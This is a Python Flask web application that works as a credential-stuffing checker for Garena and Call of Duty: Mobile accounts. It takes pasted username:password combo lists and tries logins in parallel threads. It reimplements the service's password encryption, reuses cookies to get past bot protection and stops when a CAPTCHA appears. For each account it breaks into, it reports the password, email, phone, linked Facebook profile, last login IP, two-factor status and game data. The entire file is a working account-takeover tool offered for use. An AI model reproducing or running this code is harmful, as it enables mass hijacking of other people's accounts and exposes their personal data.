# --- IMPORTS ---
import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import requests
import html
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES

# --- Flask and Web-related Imports ---
from flask import Flask, render_template, request, g

# --- Local Module Import ---
# This script MUST be in the same directory as app.py
import change_cookie 

# --- FLASK APP INITIALIZATION ---
app = Flask(__name__)

# --- HELPER: Strip ANSI color codes for clean web display ---
def strip_ansi_codes(text):
  ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
  return ansi_escape.sub('', str(text))

# --- JINJA2 CUSTOM FILTER ---
# This allows us to use the strip_ansi_codes function in our HTML templates
@app.template_filter('strip_ansi')
def strip_ansi_filter(text):
    return strip_ansi_codes(text)

# --- CORE CHECKER LOGIC (Adapted for Web) ---

apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    cipher_raw = cipher.encrypt(plaintext_bytes)
    return cipher_raw.hex()[:32]

def encrypt_password(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    key = generate_decryption_key(password_md5, v1, v2)
    encrypted = encrypt_aes_256_ecb(password_md5, key)
    return encrypted

def get_account_bindings(hider, coke):
    init_url = 'https://account.garena.com/api/account/init'
    try:
        response = requests.get(init_url, headers=hider, cookies=coke, timeout=20)
        response.raise_for_status()
        data = response.json()
        if not data or 'user_info' not in data: return {'success': False, 'error': 'User information not found'}
        user_info = data.get('user_info', {})
        is_clean = (user_info.get('email_v') == 0 and not user_info.get('mobile_no'))
        login_history = data.get('login_history', [])
        last_login_details = {}
        if len(login_history) >= 2:
            login_history.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
            second_last = login_history[1]
            ts = second_last.get('timestamp')
            last_login_details = {
                'last_login': datetime.fromtimestamp(ts).strftime('%B %d, %Y') if ts else 'N/A',
                'last_login_where': second_last.get('source', 'N/A'),
                'ipk': second_last.get('ip', 'N/A'),
                'ipc': second_last.get('country', 'N/A')
            }
        fb_info = user_info.get('fb_account') or {}
        return {
            'success': True, 'is_clean': "Clean" if is_clean else "Not Clean",
            'email': user_info.get('email') or 'N/A',
            'email_verified': "True" if user_info.get('email_v') else "False",
            'fb': fb_info.get('fb_username') or 'N/A',
            'fbl': f"https://www.facebook.com/profile.php?id={fb_info.get('fb_uid')}" if fb_info.get('fb_uid') else 'N/A',
            'facebook_connected': "True" if fb_info.get('fb_username') else "False",
            'mobile': user_info.get('mobile_no') or 'N/A',
            'country': user_info.get('acc_country') or 'N/A', 'shell': user_info.get('shell', 0),
            'avatar_url': user_info.get('avatar') or 'N/A',
            'authenticator_enabled': "True" if user_info.get('authenticator_enable') else "False",
            'two_step_enabled': "True" if user_info.get('two_step_verify_enable') else "False",
            'count': user_info.get('acc_country') or 'UNKNOWN', **last_login_details
        }
    except (requests.RequestException, json.JSONDecodeError) as e:
        return {'success': False, 'error': f"API request failed: {e}"}

def format_result_web(init_data, username, password):
    clean_status = init_data.get('is_clean', "Not Clean")
    codm_data = init_data.get('codm_data', {})
    
    codm_info_section = f"""
[ Call of Duty: Mobile ]
Region: {codm_data.get('region', 'N/A')}
Nickname: {codm_data.get('nickname', 'N/A')}
Level: {codm_data.get('level', 'N/A')}
Player UID: {codm_data.get('uid', 'N/A')}
"""
    return f"""
[ KENSHI KUPAL REPORT ]
Account Status: {clean_status}
---------------------------------
[ Account Credentials ]
Username: {username}
Password: {password}

[ Location & Access ]
Last Login: {init_data.get('last_login', 'N/A')}
From: {init_data.get('last_login_where', 'N/A')}
Country: {init_data.get('country', 'N/A')}
Source IP: {init_data.get('ipk', 'N/A')}

[ Security Status ]
Shells: {init_data.get('shell', 0)}
Email: {init_data.get('email', 'N/A')} ({'Verified' if init_data.get('email_verified') == "True" else 'Not Verified'})
Mobile No.: {init_data.get('mobile', 'N/A')}
Authenticator: {'Enabled' if init_data.get('authenticator_enabled') == "True" else 'Disabled'}
2FA: {'Enabled' if init_data.get('two_step_enabled') == "True" else 'Disabled'}
{codm_info_section}
"""

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
    headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=20, allow_redirects=True)
        res.raise_for_status()
        parsed_url = urlparse(res.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token extracted."
    except requests.RequestException as e:
        return f"[FAILED] Initial redirect error: {e}"
    
    check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
    check_login_headers = {"codm-delete-token": extracted_token, "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    try:
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=20)
        check_login_response.raise_for_status()
        data = check_login_response.json()
        if data and "user" in data:
            user = data["user"]
            return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
        return "[FAILED] No CODM user data"
    except (requests.RequestException, json.JSONDecodeError) as e:
        return f"[FAILED] CODM data fetch error: {e}"

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa):
    params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
    url = apkrov + urlencode(params)
    try:
        res = requests.get(url, headers=selected_header, cookies=cookies, timeout=20)
        if "captcha" in res.text.lower() or res.status_code == 403:
            return "CAPTCHA_BLOCKED", None
        login_json = res.json()
    except (requests.RequestException, json.JSONDecodeError):
        return "FAILED: Connection Error or Invalid JSON", None

    if login_json.get("error_auth") or login_json.get("error"):
        return f"FAILED: {login_json.get('error_description', 'Incorrect Credentials')}", None
    
    session_key = login_json.get("session_key")
    if not session_key: return "FAILED: Missing Session Key", None

    set_cookie = res.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''

    coke = change_cookie.get_cookies()
    coke.update({"datadome": dataa, "sso_key": sso_key})
    hider = {'Referer': f'https://account.garena.com/?session_key={session_key}', 'User-Agent': selected_header["User-Agent"]}
    
    init_data = get_account_bindings(hider, coke)
    if not init_data.get('success'): return f"FAILED: {init_data.get('error', 'Unknown binding error')}", None

    head = {"User-Agent": selected_header["User-Agent"], "Referer": "https://auth.garena.com/universal/oauth"}
    data = {"client_id": "100082", "response_type": "token", "redirect_uri": redrov, "format": "json", "id": _id}
    try:
        reso = requests.post("https://auth.garena.com/oauth/token/grant", headers=head, data=data, cookies=coke)
        response_data = reso.json()
        access_token = response_data.get("access_token")
        if not access_token: return "FAILED: Could not get access token", None
        
        token_session = reso.cookies.get('token_session')
        codm_info = show_level(access_token, selected_header, sso_key, token_session, dataa, coke)
        if "[FAILED]" not in codm_info:
            nick, level, region, uid = codm_info.split("|")
            init_data['codm_data'] = {'nickname': nick, 'level': level, 'region': region, 'uid': uid}

        # Success path
        return "SUCCESS", format_result_web(init_data, account_username, password)
    except (requests.RequestException, json.JSONDecodeError):
        return "FAILED: Token exchange failed", None

def check_account(username, password):
    try:
        random_id = "17290585" + str(random.randint(10000, 99999))
        cookies, headers = change_cookie.get_cookies(), {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'}

        if cookies is None: return "CRITICAL", "Could not load cookies.json. Check file."

        params = {"app_id": "100082", "account": username, "format": "json", "id": random_id}
        login_url = "https://auth.garena.com/api/prelogin"
        
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=20)
        
        if "captcha" in response.text.lower() or "datadome" in response.text.lower() or response.status_code == 403:
            return "CAPTCHA", "CAPTCHA detected during prelogin."

        if response.status_code == 200:
            data = response.json()
            v1, v2 = data.get('v1'), data.get('v2')
            if not all([v1, v2]): return "FAILED", "Account not found or invalid prelogin data."
            
            encrypted_password = encrypt_password(password, v1, v2)
            
            status, message = check_login(username, random_id, encrypted_password, password, headers, cookies, cookies.get('datadome'))
            return status, message
        else:
            return "FAILED", f"HTTP Error {response.status_code} during prelogin."
    except Exception as e:
        return "FAILED", f"An unexpected error occurred: {str(e)}"

# --- FLASK WEB ROUTES ---

@app.route('/', methods=['GET'])
def index():
    """Renders the main page with the input form."""
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check_route():
    """Handles the form submission and runs the checker."""
    combos_text = request.form.get('combos', '')
    speed = request.form.get('speed', 'medium')
    
    accounts_to_run = [acc.strip() for acc in combos_text.splitlines() if ':' in acc]
    
    MAX_ACCOUNTS = 150 # Safety limit for Vercel's free tier timeout
    limit_warning = ""
    if len(accounts_to_run) > MAX_ACCOUNTS:
        accounts_to_run = accounts_to_run[:MAX_ACCOUNTS]
        limit_warning = f"Notice: Your list was truncated to the first {MAX_ACCOUNTS} accounts to prevent server timeout."

    thread_map = {'slow': (2, 0.8), 'medium': (5, 0.4), 'fast': (10, 0.2), 'ultra': (15, 0.1)}
    threads, delay = thread_map.get(speed, (5, 0.4))
    
    success_results = []
    failed_results = []
    
    # Use Flask's 'g' object to safely store a request-global captcha flag
    g.captcha_hit = False

    def check_wrapper(account_line):
        time.sleep(delay)
        if g.captcha_hit:
            return (account_line, "SKIPPED", "Skipped due to CAPTCHA block.")

        username, password = account_line.rsplit(':', 1)
        status, message = check_account(username, password)
        
        if status == "CAPTCHA":
            g.captcha_hit = True
        
        return (account_line, status, message)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_wrapper, acc): acc for acc in accounts_to_run}
        
        for future in as_completed(futures):
            account, status, message = future.result()
            if status == "SUCCESS":
                success_results.append({'account': account, 'details': message})
            elif status == "CAPTCHA":
                failed_results.insert(0, {'account': account, 'reason': 'THIS ACCOUNT TRIGGERED A CAPTCHA BLOCK. Scan was halted.'})
            else:
                failed_results.append({'account': account, 'reason': message})
    
    return render_template(
        'results.html',
        success_results=sorted(success_results, key=lambda x: x['account']),
        failed_results=failed_results,
        total_submitted=len(accounts_to_run),
        captcha_hit=g.captcha_hit,
        limit_warning=limit_warning
    )

# This part is for local development only. Vercel uses its own server (gunicorn).
if __name__ == '__main__':
    if not os.path.exists("cookies.json"):
        print("FATAL ERROR: `cookies.json` not found. Please create it.")
        sys.exit(1)
    app.run(debug=True, host='0.0.0.0', port=5001)